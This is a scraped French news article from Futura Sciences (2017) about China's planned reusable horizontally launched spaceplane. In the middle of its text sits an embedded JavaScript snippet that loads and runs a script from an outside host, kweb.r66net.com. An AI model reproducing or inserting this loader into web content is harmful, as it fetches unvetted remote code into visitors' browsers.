{"title": "Un avion-navette spatiale annonce par la Chine", "newspaper": "Futura Sciences", "author": ["Remy Decourt"], "date_publi": "2017-11-13", "content": "D'ici trois ans, la Chine entend lancer un avion spatial reutilisable capable d'atteindre l'orbite. Technologiquement, tout n'est visiblement pas maitrise. Mais pour combien de temps ? Sans surprise, les informations sont rares. Ce qu'il faut retenir Inedit : un vehicule spatial qui decolle et atterrit comme un avion.  L'aerospatiale chinoise a quelques encablures de prendre une avance technologique. Multi-taches, il se destine au transport de passager, de fret et servira aussi a des fins commerciales et touristiques. Il y a quelques jours, de nombreux quotidiens chinois ont rapporte une declaration de la CASTC ( China Aerospace Science and Technology Corporation ) annoncant le lancement d'un avion spatial reutilisable en 2020. Il etait connu que la Chine travaille sur plusieurs concepts de vehicules spatiaux reutilisables, dont certains habites, mais l'existence d'un tel projet aussi avance est tres surprenante. Une premiere question est celle de la nature du vehicule, qui semble distincts des deux projets deja connus. Le dernier est l'avion spatial Teng Yun, presente lors de la conference internationale  Global Space Exploration 2017 , qui s'est tenue a Pekin, et annonce a l'horizon 2030. Le premier etait bien celui d'une famille d' avions spatiaux et suborbitaux reutilisables , devoile lors du 67 e  congres international d' astronautique , en septembre 2016 au Mexique. Mais plusieurs des caracteristiques annoncees (performances, missions, decollage a la verticale) different de celles de l'avion spatial prevu en 2020.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Un avion spatial pour un acces peu couteux a l'orbite basse Difficile d'y voir clair donc. Cependant, quelques informations ont ete rendues publiques sur ce futur vehicule. Il sera reutilisable, ce qui n'est pas une surprise. En revanche, il est cense decoller et atterrir horizontalement, ce qui serait une premiere mondiale. La  navette spatiale americaine  ou le  X-37B  decollent a la verticale. L'avion spatial chinois utilisera deux types de motorisation. Un  statoreacteur  lui permettra d'atteindre les couches superieures de l' atmosphere  et un moteur-fusee le mettra en  orbite  autour de la  Terre . En outre, les delais de mise en oeuvre sont censement tres courts. Il se cantonnera a l'orbite basse, de 300 a 500 kilometres d'altitude, et repond a des besoins identifies par les agences spatiales pour une tres grande variete de missions. Par exemple, il pourra etre utilise pour la rotation des equipages et le transport de fret a destination de la  Station spatiale chinoise , qui devrait fonctionner a la date de la mise en service de ce vehicule. Il servira egalement a des fins militaires et pour des services commerciaux et de tourisme spatial. ", "theme": "sciences"}